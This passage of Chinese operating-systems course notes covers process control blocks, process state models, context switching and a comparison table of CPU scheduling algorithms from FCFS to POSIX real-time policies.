进程管理与进程调度</h2><ol><li><strong>进程控制块（PCB）</strong> 是操作系统内核中为每个进程创建的一个核心数据结构，它如同进程的“身份证”和“档案袋”，完整地记录了进程的所有关键信息。当进程被创建时，内核就为其分配一个PCB；当进程被调度执行时，CPU的上下文（如寄存器值）被存入其PCB；当进程被切换下CPU时，其运行状态又从PCB中恢复。PCB中主要包含<strong>进程标识信息（如PID）</strong>、<strong>处理器状态（如寄存器、程序计数器）</strong>、<strong>进程控制信息（如状态、优先级）</strong> 以及<strong>资源清单（如打开的文件、内存分配）</strong>。因此，PCB是操作系统感知、管理和控制进程的唯一实体，是进程调度的直接依据。</li><li>三状态模型（运行、就绪、阻塞）—（+new +terminated）—-&gt; 五状态模型 —-（+suspend）—&gt;七状态模型。</li></ol><p><img src="/../../../../aimgs/posts/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AB%A0%E8%8A%82%E7%AC%94%E8%AE%B0/%E4%BA%94%E7%8A%B6%E6%80%81%E6%A8%A1%E5%9E%8B.png" alt="五状态模型"></p><p><img src="/../../../../aimgs/posts/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AB%A0%E8%8A%82%E7%AC%94%E8%AE%B0/%E4%B8%83%E7%8A%B6%E6%80%81%E6%A8%A1%E5%9E%8B.png" alt="七状态模型"></p><ol start="3"><li><p><strong>操作系统的上下文切换-调度循环</strong>是内核在多进程间实现并发执行的核心机制。其本质是一个“保存-切换-恢复”的循环：当定时中断发生或运行中进程主动放弃CPU时，<strong>调度器</strong>会首先将当前进程的执行现场（包括程序计数器、寄存器等上下文）保存到其进程控制块（PCB，在内存中）中，并将其状态置为就绪或阻塞；随后，<strong>调度算法</strong>从就绪队列中选择一个最应运行的进程，并将其PCB中保存的上下文重新加载到CPU寄存器中；最后，CPU开始执行新进程。这个过程循环往复，通过快速轮转，在用户看来便形成了多个进程“同时”运行的假象。整个循环完全由内核在背后驱动，对进程透明，是实现多任务并发的基石。</p></li><li><p><strong>开销</strong>：（1）只有一个CPU核心，非并行 切换开销:  同进程:  低 不同进程: 高 数据保护 同进程: 低 不同进程: 高 共享数据开销 同进程: 低 不同进程: 高 。（2）多个CPU核心，并行 切换开销:  同进程:  低 不同进程: 高 数据保护 同进程: 低 不同进程: 高 共享数据开销 同进程: 低 不同进程同核心：中 不同进程不同核心: 高 （cache)</p></li><li><p><strong>内部事件</strong>源于当前正在CPU上执行的进程自身的动作，而<strong>外部事件</strong>则源于与该进程无关的系统活动。内部事件：系统调用如fopen、发生异常、主动让出CPU。外部事件：时钟中断、I/O中断。</p></li><li><p>进程调度主要是队列操作，调度算法从就绪队列中选取线程。</p></li><li><p>CPU进程调度：通过多道程序设计得到CPU的最高利用率。CPU调度决策可能发生在：进程从运行切换到等待，进程从运行切换到就绪，进程从等待切换到就绪，进程终止。14非抢占，23抢占。调度延时：调度程序终止一个进程的运行并并启动另一个进程运行所花的时间</p></li><li><p>调度算法优化准则：最大的CPU利用率，最大的吞吐量，最短的周转时间，最短的等待时间，最短的响应时间。</p></li><li><p>调度算法：先来先服务FCFS、短作业优先SJF、最短剩余时间优先（指数平均数）、轮转法、优先级调度、多级队列、多级反馈队列、最早截止时间优先、比例分享调度、可移植操作系统接口（POSIX）实时调度</p></li></ol><p><img src="/../../../../aimgs/posts/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AB%A0%E8%8A%82%E7%AC%94%E8%AE%B0/%E6%9C%80%E7%9F%AD%E5%89%A9%E4%BD%99%E6%97%B6%E9%97%B4%E4%BC%98%E5%85%88.png" alt="最短剩余时间优先"></p><ol start="10"><li>操作系统调度算法详解</li></ol><table><thead><tr><th align="left">调度算法</th><th align="left">核心思想</th><th align="left">调度依据</th><th align="left">优点</th><th align="left">缺点</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left"><strong>先来先服务 (FCFS)</strong></td><td align="left">像排队一样，先到的进程先接受服务。</td><td align="left">进程到达就绪队列的时间。</td><td align="left">简单、公平、实现简单。</td><td align="left">** convoy效应 **：短进程可能因等待长进程而耗时很久；平均等待时间较长。</td><td align="left">早期批处理系统；现已很少作为主要算法。</td></tr><tr><td align="left"><strong>短作业优先 (SJF)</strong></td><td align="left">优先运行预计执行时间最短的进程，以使平均等待时间最小。</td><td align="left">进程的（预估）下一个CPU执行区间长度。</td><td align="left"><strong>理论上的最优平均等待时间</strong>（针对非抢占式）。</td><td align="left"><strong>可能导致长进程饥饿</strong>；需要预知未来（执行时间难以准确预估）。</td><td align="left">理论模型；适用于能较准确估计运行时间的批作业。</td></tr><tr><td align="left"><strong>最短剩余时间优先 (SRTN)</strong></td><td align="left">SJF的<strong>抢占式</strong>版本。当新进程就绪时，会与当前进程的剩余时间比较，运行剩余时间最短的。</td><td align="left">进程的<strong>剩余</strong>执行时间。</td><td align="left">比SJF有更优的平均周转时间。</td><td align="left">实现复杂；需要预知总执行时间；可能造成长进程饥饿。</td><td align="left">理论价值高，实际因“预知时间”问题而较少使用。</td></tr><tr><td align="left"><strong>轮转法 (RR)</strong></td><td align="left">为每个进程分配一个固定的<strong>时间片</strong>，时间片用完则强行切换，进程回到就绪队列末尾。</td><td align="left">时间片是否用完。</td><td align="left"><strong>公平性强</strong>，响应时间有保障，适用于分时系统。</td><td align="left">时间片设置关键：太长退化为FCFS；太短切换开销过大。平均等待时间较长。</td><td align="left"><strong>交互式系统</strong>的经典算法（如Unix/Linux的默认调度）。</td></tr><tr><td align="left"><strong>优先级调度</strong></td><td align="left">每个进程拥有一个优先级，调度器总是选择优先级最高的进程运行。</td><td align="left">进程的优先级（静态或动态）。</td><td align="left">能区分任务紧急程度，灵活。</td><td align="left"><strong>可能导致低优先级进程饥饿</strong>；静态优先级不够灵活。</td><td align="left">广泛用于各种系统，常与其他算法（如RR）结合使用。</td></tr><tr><td align="left"><strong>多级队列 (MQ)</strong></td><td align="left">将就绪队列划分为多个独立队列，每个队列可拥有自己的调度算法（如系统进程用RR，交互进程用高优先级）。</td><td align="left">进程的类型（系统、交互、批处理等）。</td><td align="left">根据进程类型区别对待，策略灵活。</td><td align="left">队列间调度不灵活（可能存在队列饥饿）；需要预先分类。</td><td align="left">用于对任务类型有清晰划分的系统。</td></tr><tr><td align="left"><strong>多级反馈队列 (MLFQ)</strong></td><td align="left"><strong>MQ的改进版</strong>，是实际系统中最常用的算法之一。允许进程在队列间<strong>移动</strong>（如未在时间片内完成则降低优先级）。</td><td align="left">进程已执行的时间和历史行为。</td><td align="left">结合了RR和优先级调度的优点：<strong>短作业优先完成，交互式任务响应快，长作业也不会完全饥饿</strong>。</td><td align="left">参数（队列数量、时间片大小、优先级调整规则）设置复杂，影响性能。</td><td align="left"><strong>通用操作系统的核心调度算法</strong>（如Windows NT、Unix System V）。</td></tr><tr><td align="left"><strong>最早截止时间优先 (EDF)</strong></td><td align="left">优先运行<strong>截止时间最早</strong>的任务。是<strong>动态优先级</strong>调度。</td><td align="left">任务的绝对截止时间。</td><td align="left"><strong>理论最优</strong>的动态优先级实时调度算法（CPU利用率可达100%）。</td><td align="left">进程超载时系统行为难以预测；实现复杂。</td><td align="left"><strong>软实时系统</strong>（如多媒体播放）。</td></tr><tr><td align="left"><strong>比例分享调度</strong></td><td align="left">目标是让每个进程获得其预先定义的<strong>CPU时间份额</strong>（如A占50%，B占30%）。</td><td align="left">进程已获得的CPU时间与其应得份额的差距。</td><td align="left">能提供精确的QoS（服务质量）保证。</td><td align="left">需要额外的机制（如彩票、步幅）来跟踪和决策。</td><td align="left">需要保证特定应用性能的场景（如虚拟化、云平台）。</td></tr><tr><td align="left"><strong>POSIX实时调度</strong></td><td align="left">这是一套<strong>API标准</strong>，定义了如何控制调度策略，而非具体算法。主要包括： 1. <strong><code>SCHED_FIFO</code></strong>: 类似FCFS，但基于静态优先级，可抢占低优先级任务，无限时间运行。 2. <strong><code>SCHED_RR</code></strong>: 类似<code>SCHED_FIFO</code>，但增加了时间片，同优先级任务按轮转法执行。 3. <strong><code>SCHED_OTHER</code></strong>: 指系统默认的非实时调度策略（如Linux的CFS）。</td><td align="left">由程序员通过API设置的静态优先级和策略。</td><td align="left">为实时应用提供<strong>可预测性和确定性</strong>。</td><td align="left">需要程序员负责正确设置优先级，否则高优先级任务可能霸占CPU。</td><td align="left"><strong>硬实时和软实时应用</strong>（如工业控制、机器人、航空电子）。</td></tr></tbody></table><ol start="11"><li>算法评估确定性评价：对于每个算法计算最小平均等待时间。随机过程的排队模型，下一个人将在x时间内到达。概率模型，不是精确值，而是均值</li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机基础课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程学习 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
